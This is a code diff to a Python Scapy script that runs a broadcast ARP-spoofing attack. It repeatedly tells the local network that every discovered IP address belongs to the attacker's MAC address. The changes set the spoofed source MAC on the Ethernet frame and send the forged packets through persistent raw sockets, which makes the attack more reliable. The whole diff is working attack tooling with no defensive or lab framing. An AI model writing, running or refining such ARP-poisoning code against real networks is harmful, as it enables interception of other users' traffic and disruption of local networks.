@@ -47,7 +47,6 @@ def get_default_if():
     for item in if_list:
         if if_dic[item].name != "lo":
             return if_dic[item].name
-        
 
 def on_key_press(event):
     if event.name == 'q' or event.name == 'Q':
@@ -478,6 +477,9 @@ def main():
         last_spoof_time[ip] = time.time()
     logger.info(f"Studying local network gave us devices: {old_list}")
 
+    s = conf.L3socket(iface=interface)
+    s2 = conf.L2socket(iface=interface)
+
     while True:
         try:
             '''
@@ -515,9 +517,10 @@ def main():
                 # Переотправка в эфир подделки собой всех найденных локальных ip
                 logger.info(f"Gone 2 minutes, resending arp spoof to all known {old_list}")
                 for i in range(len(old_list)):
-                    arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=old_list[i], hwsrc=spoof_mac, hwdst="ff:ff:ff:ff:ff:ff")
+                    arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff", src=spoof_mac) / ARP(op=2, psrc=old_list[i], hwsrc=spoof_mac)
                     logger.info(f"Resent arp spoof about {old_list[i]}")
-                    sendp(arp_packet, verbose=0, count=1)
+                    s2.send(arp_packet)
+                    #sendp(arp_packet, verbose=0, count=1)
                     global_resend_time = time.time()
                 
                 for ip in old_list:
@@ -533,9 +536,10 @@ def main():
                 # Переотправка в эфир подделки собой всех найденных локальных ip
                 logger.info(f"Gone 2 minutes, resending arp spoof to all known {old_list}")
                 for i in range(len(old_list)):
-                    arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=old_list[i], hwsrc=spoof_mac, hwdst="ff:ff:ff:ff:ff:ff")
+                    arp_packet = Ether(src=spoof_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(op=2, psrc=old_list[i], hwsrc=spoof_mac)
                     logger.info(f"Resent arp spoof about {old_list[i]}")
-                    sendp(arp_packet, verbose=0, count=1)
+                    s2.send(arp_packet)
+                    #sendp(arp_packet, verbose=0, count=1)
                     global_resend_time = time.time()
             pass
         except OSError as e:
@@ -561,4 +565,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-    
